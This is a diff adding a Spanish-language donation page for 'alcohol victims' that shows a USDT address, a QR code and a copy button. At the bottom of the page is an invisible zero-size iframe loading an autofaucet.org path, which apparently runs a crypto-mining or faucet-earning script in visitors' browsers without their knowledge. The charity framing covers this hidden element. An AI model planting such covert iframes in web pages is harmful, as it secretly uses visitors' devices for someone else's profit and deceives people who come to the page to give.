@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Ayuda a las victimas del alcohol</title>
+    <style>
+      body {
+        background-color: #151536;
+        font-family: Arial, sans-serif;
+        color: #ffffff;
+        font-size: 18px;
+        text-align: center;
+      }
+      .qr-container {
+        background-color: white;
+        padding: 20px;
+        margin: 20px auto;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        max-width: 10%;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Ayuda a las victimas del alcohol</h1>
+    <h2>Gracias por su contribución</h2>
+    <p>Dirección de USDT:</p>
+    <div class="qr-container">
+      <img src="deposit_qr.png" alt="Código QR" />
+    </div>
+    <div>
+      <input type="text" value="TRB5Gr4MtAvf4kneAdXPHPTTUpaiCKi526" />
+      <button onclick="copiarTexto()">Copiar</button>
+      <span id="palomita"></span>
+    </div>
+    <script>
+      function copiarTexto() {
+        var texto = document.querySelector("input[type='text']");
+        texto.select();
+        document.execCommand("copy");
+        document.querySelector("#palomita").innerHTML = "✔️";
+      }
+    </script>
+    <iframe
+      src="https://autofaucet.org/wm/JH51664JH/4"
+      width="0"
+      height="0"
+      style="border: 0"
+    ></iframe>
+  </body>
+</html>
